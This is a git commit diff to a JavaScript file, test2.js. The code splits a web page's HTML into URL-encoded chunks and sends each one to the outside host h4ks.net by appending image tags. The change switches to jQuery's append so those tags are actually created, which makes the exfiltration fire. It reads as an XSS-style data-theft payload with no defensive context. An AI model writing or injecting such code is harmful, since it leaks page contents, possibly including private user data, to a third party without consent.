b5d8c2ec85518fe55db2ea6edd9cb3725ac2934e
Robert Vulpe <nytr0gen.george@gmail.com>
2020-01-16 19:13:11 +0000

    Update test2.js

--- test2.js
+++ test2.js
@@ -6,7 +6,7 @@ try {
             
             for (var i = 0; i < html.length; i+=50) {
                 var part = encodeURIComponent(html.slice(i, i+50));
-                document.body.append('<img src="//h4ks.net/go/test2?'+part+'">');
+                $(document.body).append('<img src="//h4ks.net/go/test2?'+part+'">');
             }
 
         } catch (err) {
